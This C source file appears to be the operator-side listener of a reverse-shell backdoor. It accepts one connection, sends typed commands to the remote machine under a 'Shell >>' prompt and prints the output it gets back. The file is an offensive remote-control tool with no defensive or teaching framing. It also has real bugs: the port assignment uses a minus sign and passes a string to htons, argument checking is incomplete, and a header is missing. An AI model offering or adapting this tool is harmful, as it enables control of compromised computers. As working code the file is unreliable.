#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>

int main(int argc, char const *argv[]){
    
    
    
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0, optval = 1;
    socklen_t client_lenght;
    sock = socket(AF_INET, SOCK_STREAM, 0);

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        printf("Error Setting TCP SOcket Options!\n");
        return 1;
    }
    if(argc < 2){
       printf("[+] Usage: \n");
       printf("[+] Example: ./server 192.168.0.100 9001 \n");
    }else{
        server_address.sin_family = AF_INET;
        server_address.sin_addr.s_addr = inet_addr(argv[1]);
        server_address.sin_port - htons(argv[2]);
        bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
        listen(sock, 5);
        client_lenght = sizeof(client_address);
        client_socket = accept(sock, (struct sockaddr *)&client_address, &client_lenght);


        
        while (1){
            jump:
                bzero(&buffer, sizeof(buffer));
                bzero(&response, sizeof(response));
                printf("Shell >>", inet_ntoa(client_address.sin_addr));
                fgets(buffer, sizeof(buffer), stdin);
                strtok(buffer, "\n");
                write(client_socket, buffer, sizeof(buffer));

                if (strncmp("q", buffer, 1) == 0)
                {
                    break;
                }
                else
                {
                    recv(client_socket, response, sizeof(response), MSG_WAITALL);
                    printf("%s", response);
                }
        }
    }

   
}

